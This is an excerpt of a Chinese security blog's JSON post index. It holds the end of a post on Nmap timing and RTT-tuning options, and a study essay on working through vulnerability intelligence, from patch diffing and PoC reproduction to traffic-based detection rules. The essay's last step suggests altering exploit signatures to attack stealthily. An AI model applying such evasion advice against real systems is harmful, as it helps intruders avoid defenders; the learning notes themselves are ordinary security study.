在每次接收到探针响应时记录耗时，估算网络情况并进行计算得出timeout数值。 –max-retries 允许探针重传的最大值 –host-timeout 指定单个主机扫描的最大时长，当到达最大时间，将放弃该主机。 –scan-delay, –max-scan-delay 指定针对单个主机每个探针之间的最小和最大延迟控制； –min-rate, –max-rate 指定每秒发送的探针数据包最小和最大速率，这个值允许超过Nmap的拥塞控制算法限制。 –defeat-rst-ratelimit 指定目标主机的RST数据包响应率，这个不太了解。 优化时间参数 -T Nmap提供了一些时间模板-T0-5，随着数字增大，扫描速度将加快。可以使用 nmap -T5 -d 的形式查看时间模板的参数 不同级别的参数见下表 名称 T0 (Paranoid) T1(Sneaky) T2(Polite) T3(Normal) T4(Aggressive) T5(Insane) min-rtt-timeout 100 100 100 100 100 50 max-rtt-timeout 300,000 15,000 10,000 10,000 1,250 300 initial-rtt-timeout 300,000 15,000 1,000 1,000 500 250 max-retries 10 10 10 10 6 2 初始化扫描延迟 scan-delay 300,000 15,000 400 0 0 0 最大TCP扫描延迟 300,000 15,000 1,000 1,000 10 5 最大UDP扫描延迟 300,000 15,000 1,000 1,000 1,000 1,000 host-timeout 0 0 0 0 0 900,000 min-parallelism 动态 动态 动态 动态 动态 动态 max-parallelism 1 1 1 动态 动态 动态 min-hostgroup 动态 动态 动态 动态 动态 动态 max-hostgroup 动态 动态 动态 动态 动态 动态 min-rate 无限制 无限制 无限制 无限制 无限制 无限制 max-rate 无限制 无限制 无限制 无限制 无限制 无限制 defeat-rst-ratelimit 默认未启用 默认未启用 默认未启用 默认未启用 默认未启用 默认未启用 注意：动态的，不受时间模板限制 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:3","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.4 -Pn 加速 ​ 之前有一个疑问就是 -Pn 跳过主机发现阶段，是否能缩短扫描时间？ ​ 答案是否定的，因为主机发现阶段所进行的不光是探测主机是否存活，同时也记录了与目标主机之间的网络情况，给出一个RTT评估并调整超时重传等待机制，来提高接下去的端口扫描速度。 ​ 不过我们可以通过Nmap的一些选项来手动指定这些参数，来加快扫描速度。 ​ -Pn 最大的问题就是无法获取到网络状态信息，由于重传和RTT估算的问题，导致整个扫描过程等待时间过长，因此我们可以手动指定–max-rtt-timeout, –initial-rtt-timeout。 ​ Nmap没有从每个主机上收集到足够的响应来准确估算延迟和丢包率，那么我们首先需要解决这个问题。我们可以通过命令行来手动收集该信息，可以通过ping 相邻的在线主机获取延迟估计，当然可能会有禁ping的现象，可以用nmap附赠的小工具nping 对开放的端口进行探测，获取延迟估计。 ​ 根据这个延迟，我们大致能知道到该目标范围主机的网络状况，因此我们只需要手动指定–max-rtt-timeout, –initial-rtt-timeout 为比这个延迟大一定程度的值就可以了。例如延迟为60毫秒，则我们可以将其指定为 –max-rtt-timeout 200ms –initial-rtt-timeout 150ms。 ​ 一个完整的案例，见 《NNS》第四章：端口扫描概述——案例：扫描大型网络以查找某个开放的TCP端口。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:4","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x06 总结 ​ 本文算是基于《Nmap Network Scanning》的读后感吧，全书内容很多也学到了很多，同时也对自己的相关知识进行了一个整理。 ​ 这里还未涉及到NSE脚本引擎，那是一个宝藏，具有很好的扩展性，可以基于NSE脚本引擎，开发定制化自己的脚本以实现相应的功能。网络上也有很多相关的文章可以学习参考。 ​ 还有一部分内容是关于防火墙和IDS的对抗技巧，这部分由于实践检验的比较少，没什么发言权，就不说了。 ​ 最后，感觉大家的阅读，如果觉得本文写的还可以，对您有帮助，麻烦您点个赞；如果您有任何的批评、意见和建议，欢迎在评论区留言。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:7:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["随笔"],"content":"2021年4月13日 学习随笔：本文从一篇文章出发，总结一些安全学习研究的想法。","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/","tags":["随笔"],"title":"001-2021年4月13日 学习随笔","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"},{"categories":["随笔"],"content":"本文从一篇文章出发，总结一些安全学习研究的想法。 ","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/:0:0","tags":["随笔"],"title":"001-2021年4月13日 学习随笔","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"},{"categories":["随笔"],"content":"0x00 背景 最近演习期间，精神紧张，忙里偷闲看看大佬们的历史博客，学习一些东西。 今天就看了P牛的《宝塔面板phpMyAdmin未授权访问漏洞是个低级错误吗？》，也不是为了漏洞复现分析什么的，就是从这篇文章中学到的学习方法。 ","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/:1:0","tags":["随笔"],"title":"001-2021年4月13日 学习随笔","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"},{"categories":["随笔"],"content":"0x01 一些想法 当我们收到一个漏洞情报时，该怎么做呢？我觉得可以这么几个角度来做： 收集整理漏洞情报基本信息，包括漏洞影响范围、漏洞类型、漏洞等级、漏洞利用条件、缓解措施和修复建议；基本上收集整理完这些信息，可以下发给各单位进行自查和防护，算是一条比较详细的威胁情报了 漏洞点位置，有无poc/exp公开 如果无poc/exp公布，但是有补丁文件公布，可以对比打补丁前和补丁后的代码，找到漏洞点位置 漏洞分析，漏洞形成的原因。 对于第三点漏洞分析来说，通常只会看下漏洞点位置的代码上下文，漏洞是怎么形成的，如何构造poc/exp，做一个漏洞复现就结束了。 这是很多漏洞分析文章的通病，这些文章在出现漏洞后跟一遍漏洞代码，找到漏洞发生点和利用方法就结束了，并没有深入研究开发为什么会这么写，那么下次你还是挖不出漏洞。 但是看了P牛的文章，又有了新的认知。我们不光要知道这个漏洞代码存在之后的事情，我们还要考虑这个代码为什么要这么写。这就要考虑该漏洞的影响版本，从最早的版本和再前一个版本之间的区别，思考这背后是什么让开发者改变了代码，官方做这些动作的原因。 漏洞复现 利用公开的poc/exp，或自己分析后得出的poc进行漏洞复现，并构思分析可能的利用链。对poc的功能进行完善，往exp发展。 检测分析 对使用poc/exp进行漏洞复现过程中所产生的流量进行分析，尝试提取流量特征，思考什么样的规则可以检测到该攻击。 使用该poc/exp对系统产生的影响，是否有日志产生，是否有文件落地等。 exp修改，隐蔽痕迹 修改exp特征，写自己的exp工具，竟可能做到隐蔽式攻击。 ","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/:2:0","tags":["随笔"],"title":"001-2021年4月13日 学习随笔","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"}]